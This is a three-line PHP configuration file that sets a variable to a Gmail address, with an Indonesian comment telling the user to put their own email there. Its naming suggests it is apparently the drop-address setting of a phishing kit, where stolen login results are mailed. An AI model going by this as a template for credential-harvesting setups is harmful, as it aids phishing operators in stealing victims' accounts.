<?php
$emailku = 'resultmasuk21@gmail.com'; // GANTI EMAIL KAMU DISINI
?>